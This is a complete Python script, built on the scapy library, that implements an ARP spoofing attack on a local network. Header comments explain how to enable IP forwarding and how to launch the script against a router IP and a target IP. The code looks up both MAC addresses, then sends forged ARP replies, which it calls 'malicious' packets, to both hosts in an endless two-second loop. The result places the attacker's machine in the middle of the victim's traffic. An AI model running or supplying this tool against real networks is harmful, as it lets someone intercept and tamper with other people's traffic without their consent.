# ARP Spoofer tool 2021, automated loop

## To forward traffic, in terminal before spoof, enter:
##                  ""  echo 1 >> /proc/sys/net/ipv4/ip forward        ""
## Run command:     ""  python3 arpspoofer.py <router IP> <target IP>  ""

# --- Libraries ---
import scapy.all as scapy
import sys
import time

## Send malicious packet to target machine to receive as router, and to router to receive on behalf of target machine
# Get MAC address from router and target machine function
def getMAC(ipAddress):
    broadcastLayer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpLayer = scapy.ARP(pdst=ipAddress)
    getmacPacket = broadcastLayer/arpLayer
    answer = scapy.srp(getmacPacket, timeout=2, verbose=False)[0] #sends and retrieves response, grabs first list (answer) saved in variable
    return answer[0][1].hwsrc #returns only MAC address of target machine (from first list ([0]) retrieve response ([1]) .hwsrc attribute


# Spoof targets function
def spoof(routerIP, targetIP, routerMAC, targetMAC):
    malpacket1 = scapy.ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc=targetIP) #malicious packet for router
    malpacket2 = scapy.ARP(op=2, hwdst=targetMAC, pdst=targetIP, psrc=routerIP) #malicious packet for target machine
    scapy.send(malpacket1)
    scapy.send(malpacket2)

targetIP = str(sys.argv[2]) # read target IP when run ("sys.argv" is a list in Python, which contains the command-line arguments passed to the script.)
routerIP = str(sys.argv[1]) # read router IP when run. (first arg. is name of program, second is router, third is target. e.g. "python3 arpspoofer 192.168.1.1 192.168.1.4"
targetMAC = str(getMAC(targetIP))
routerMAC = str(getMAC(routerIP))


# Spoof targets loop
try:
    while True:
        spoof(routerIP, targetIP, routerMAC, targetMAC)
        time.sleep(2) #so it doesnt spoof too fast, spoof every 2 seconds
except KeyboardInterrupt:
    print(" Closing ARP Spoofer")
    exit(0)

